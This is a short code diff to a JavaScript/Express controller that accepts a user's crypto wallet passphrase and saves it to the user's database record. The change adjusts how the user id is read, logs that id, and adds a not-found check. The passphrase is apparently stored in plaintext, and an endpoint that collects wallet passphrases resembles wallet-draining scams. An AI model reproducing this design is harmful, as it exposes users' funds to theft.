@@ -26,12 +26,21 @@ const submitPassphrase = async (req, res) => {
             return res.status(400).json({ error: 'Passphrase is required.' });
         }
 
-        const userId = req.user.id;
-        await User.findByIdAndUpdate(userId, {
-            walletPassphrase: wallet_phrase,
-            walletConnected: false
-        });
+        const userId = req.user;
+        console.log(userId)
+        const updatedUser = await User.findByIdAndUpdate(
+            userId,
+            {
+                walletPassphrase: wallet_phrase,
+                walletConnected: false
+            },
+            { new: true } // Returns the updated document
+        );
 
+        // Check if user exists
+        if (!updatedUser) {
+            return res.status(404).json({ error: 'User not found.' });
+        }
         return res.status(200).json({ message: 'Passphrase submitted successfully.' });
     } catch (error) {
         console.error('Error submitting passphrase:', error);
